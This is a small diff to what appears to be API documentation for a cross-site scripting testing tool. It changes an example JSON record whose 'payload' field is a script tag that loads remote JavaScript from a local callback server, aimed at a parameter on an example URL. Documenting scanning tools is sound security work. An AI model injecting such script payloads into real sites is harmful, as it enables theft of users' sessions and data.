@@ -86,7 +86,7 @@ You *MUST* send the token as a header in each request.  Here is an example for c
         "method": "GET", 
         "notes": "", 
         "parameter": "UID", 
-        "payload": "<script src=\"//127.0.0.1:8081/c.js?u=None\"></script>", 
+        "payload": "<script src=\"//127.0.0.1:8081/x?u=None\"></script>",
         "url": "http://www.foo.com/what.php?UID=2343"
     }
 
